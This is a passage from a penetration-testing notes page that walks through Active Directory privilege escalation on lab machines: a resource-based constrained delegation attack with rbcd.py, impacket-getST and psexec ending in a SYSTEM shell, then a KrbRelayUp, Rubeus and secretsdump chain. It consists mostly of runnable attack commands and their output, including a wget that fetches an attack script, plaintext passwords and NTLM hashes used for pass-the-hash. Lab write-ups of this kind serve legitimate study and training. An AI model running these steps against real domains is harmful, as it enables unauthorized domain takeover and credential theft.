└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
...
┌──(kali㉿kali)-[~]
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.120.181
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
</code></pre>
<p>Another example of this:</p>
<pre><code>./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful

</code></pre>
<p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
</code></pre>
<p>We now need to get the administrator service ticket. We can do this by using <code>impacket-getST</code> with our privileged machine account.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
</code></pre>
<p>Another example of this:</p>
<pre><code>python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password

</code></pre>
<p>Time Error</p>
<pre><code>If you get this:
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

Do this:

rdate -n $ip

</code></pre>
<p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./Administrator.ccache

or this:

export KRB5CCNAME=`pwd`/Administrator.ccache
</code></pre>
<p>Now, all we have to do is add a new entry in <strong>/etc/hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" &gt;&gt; /etc/hosts'

┌──(kali㉿kali)-[~]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file zZeQFeGQ.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service rEwK on resourcedc.resourced.local.....
[*] Starting service rEwK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32&gt; whoami
nt authority\system

C:\Windows\system32&gt; 
</code></pre>
<p>Another example of this:</p>
<pre><code>python3 psexec.py -k DC.support.htb
</code></pre>
<h3 id="krbrelayup"><a class="header" href="#krbrelayup">KrbRelayUp</a></h3>
<p>https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/</p>
<p>https://arz101.medium.com/vulnlab-bruno-f0129f60ac40</p>
<p>https://github.com/Dec0ne/KrbRelayUp</p>
<p>https://vulndev.io/cheats-windows/</p>
<pre><code>Did this on Vulnlab Bruno


.\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 1024

Rubeus.exe asktgt /user:brunodc$ /certificate:MIIKSAIBAzCCCgQGC...snip.... /password:tV0-oN8$aB7- /enctype:AES256 /nowrap

cat temphash | base64 -d &gt; bruno_ticket.kirbi 
python3 ticketConverter.py bruno_ticket.kirbi bruno_ticket.ccache


secretsdump.py 'brunodc$'@brunodc.bruno.vl -k -no-pass

evil-winrm -i $ip -u administrator -H '13735c7d60b417421dc6130ac3e0bfd4'


.\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246

getST.py -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'uJ1$j05-iN7/gJ6#' -spn HOST/BRUNODC

smbexec.py administrator@brunodc -k -no-pass


</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="ADHashDump.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="ADHashDump.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
